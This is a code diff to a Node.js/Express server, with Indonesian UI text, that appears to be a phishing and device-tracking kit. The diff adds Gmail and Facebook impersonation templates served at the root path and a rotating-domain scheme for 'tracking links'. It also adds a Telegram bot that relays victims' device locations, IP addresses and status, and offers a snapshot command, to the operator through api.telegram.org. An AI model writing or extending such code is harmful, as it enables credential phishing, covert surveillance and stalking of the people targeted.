@@ -24,6 +24,12 @@ const crypto = require('crypto');
 // Admin token store
 const adminTokens = new Set();
 const linkExpiry = { duration: 0, enabled: false }; // 0 = no expiry, duration in minutes
+const templates = ['vault', 'gmail', 'facebook'];
+let currentTemplate = 'vault';
+const captchaData = new Map(); // deviceId -> { answer, timestamp }
+const domains = ['']; // empty = current domain, can add custom
+let currentDomainIndex = 0;
+const telegramBots = new Map(); // chatId -> { token, allowed: bool }
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
@@ -40,7 +46,7 @@ app.use(express.json({ limit: '50mb' }));
 // Admin auth middleware
 function verifyAdmin(req, res, next) {
     // Public endpoints (no auth needed)
-    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html'];
+    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/api/captcha/verify', '/api/active-domain'];
     if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path === '/index.html') return next();
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
@@ -68,6 +74,10 @@ app.get('/', (req, res, next) => {
                 return res.redirect('/lupa-password.html?expired=1');
             }
         }
+    }
+    const templatePath = path.join(__dirname, 'public', 'templates', currentTemplate + '.html');
+    if (currentTemplate !== 'vault' && fs.existsSync(templatePath)) {
+        return res.sendFile(templatePath);
     }
     next();
 });
@@ -674,6 +684,144 @@ app.post('/api/admin/expiry', (req, res) => {
 
 app.get('/api/admin/expiry', (req, res) => {
     res.json(linkExpiry);
+});
+
+// ===== TEMPLATE MANAGEMENT =====
+app.post('/api/admin/template', (req, res) => {
+    const { template } = req.body;
+    if (templates.includes(template)) {
+        currentTemplate = template;
+        res.json({ ok: true, template: currentTemplate });
+    } else {
+        res.status(400).json({ error: 'invalid template', available: templates });
+    }
+});
+
+app.get('/api/admin/template', (req, res) => {
+    res.json({ template: currentTemplate, available: templates });
+});
+
+// ===== CAPTCHA =====
+app.post('/api/captcha/verify', (req, res) => {
+    const { deviceId, answer } = req.body;
+    // Simple math captcha verification or just log it
+    if (deviceId) {
+        captchaData.set(deviceId, { answer: answer || '', time: Date.now() });
+        if (captchaData.size > 1000) {
+            const firstKey = captchaData.keys().next().value;
+            if (firstKey) captchaData.delete(firstKey);
+        }
+    }
+    res.json({ ok: true });
+});
+
+app.get('/api/captcha/data', (req, res) => {
+    const data = {};
+    for (const [id, d] of captchaData) {
+        data[id] = d;
+    }
+    res.json(data);
+});
+
+// ===== TELEGRAM BOT CONTROL =====
+const tgBotTokens = []; // stored bot tokens for polling
+
+app.post('/api/admin/telegram-bot', (req, res) => {
+    const { token } = req.body;
+    if (!token) return res.status(400).json({ error: 'token required' });
+    if (!tgBotTokens.includes(token)) tgBotTokens.push(token);
+    res.json({ ok: true, bots: tgBotTokens.length });
+});
+
+app.get('/api/admin/telegram-bot', (req, res) => {
+    res.json({ bots: tgBotTokens.length });
+});
+
+// Telegram bot polling handler
+async function pollTelegramBots() {
+    for (const botToken of tgBotTokens) {
+        try {
+            const url = `https://api.telegram.org/bot${botToken}/getUpdates?timeout=30&offset=0`;
+            const resp = await fetch(url).then(r => r.json());
+            if (resp.ok && resp.result) {
+                for (const update of resp.result) {
+                    if (update.message && update.message.text) {
+                        const chatId = update.message.chat.id;
+                        const text = update.message.text.trim();
+                        const args = text.split(' ');
+                        const cmd = args[0].toLowerCase();
+                        
+                        let reply = '';
+                        if (cmd === '/start') {
+                            telegramBots.set(chatId, { token: botToken, allowed: true });
+                            reply = 'Bot terhubung! Gunakan /devices untuk lihat daftar device.';
+                        } else if (cmd === '/devices') {
+                            const list = [];
+                            for (const [id, d] of devices) {
+                                const online = !!d.socketId && io.sockets.sockets.has(d.socketId);
+                                list.push(`${d.label} ${online ? '🟢' : '🔴'} — ${d.location ? d.location.lat.toFixed(2)+','+d.location.lng.toFixed(2) : 'N/A'}`);
+                            }
+                            reply = list.length ? 'Devices:\n' + list.join('\n') : 'Tidak ada device.';
+                        } else if (cmd === '/online') {
+                            const count = [...devices.values()].filter(d => !!d.socketId && io.sockets.sockets.has(d.socketId)).length;
+                            reply = `Device online: ${count}/${devices.size}`;
+                        } else if (cmd === '/locate') {
+                            const id = args[1];
+                            if (id && devices.has(id)) {
+                                const d = devices.get(id);
+                                reply = `${d.label}\nLat: ${d.location ? d.location.lat : 'N/A'}\nLng: ${d.location ? d.location.lng : 'N/A'}\nIP: ${d.ip || 'N/A'}\nTerakhir: ${new Date(d.lastSeen).toLocaleString()}`;
+                            } else {
+                                reply = 'Device tidak ditemukan. Gunakan /devices untuk lihat ID.';
+                            }
+                        } else if (cmd === '/help') {
+                            reply = '/devices — lihat semua device\n/online — jumlah online\n/locate [id] — lokasi device\n/snapshot [id] — ambil snapshot';
+                        } else {
+                            reply = 'Perintah tidak dikenal. Ketik /help';
+                        }
+                        
+                        if (reply) {
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: chatId, text: reply })
+                            }).catch(() => {});
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+    }
+}
+
+// Poll every 5 seconds
+setInterval(pollTelegramBots, 5000);
+
+// ===== AUTO-ROTATE DOMAIN =====
+app.post('/api/admin/domains', (req, res) => {
+    const { list } = req.body;
+    if (Array.isArray(list)) {
+        domains.length = 0;
+        domains.push(''); // current domain always first
+        for (const d of list) {
+            if (d && !domains.includes(d)) domains.push(d);
+        }
+    }
+    res.json({ ok: true, domains: domains.slice(1) });
+});
+
+app.get('/api/admin/domains', (req, res) => {
+    res.json({ domains: domains.slice(1), currentIndex: currentDomainIndex });
+});
+
+app.post('/api/admin/domains/rotate', (req, res) => {
+    currentDomainIndex = (currentDomainIndex + 1) % domains.length;
+    res.json({ ok: true, domain: domains[currentDomainIndex] || 'current' });
+});
+
+// Get active domain for tracking link
+app.get('/api/active-domain', (req, res) => {
+    const domain = domains[currentDomainIndex];
+    res.json({ domain: domain || req.get('host'), index: currentDomainIndex });
 });
 
 // Admin login/logout
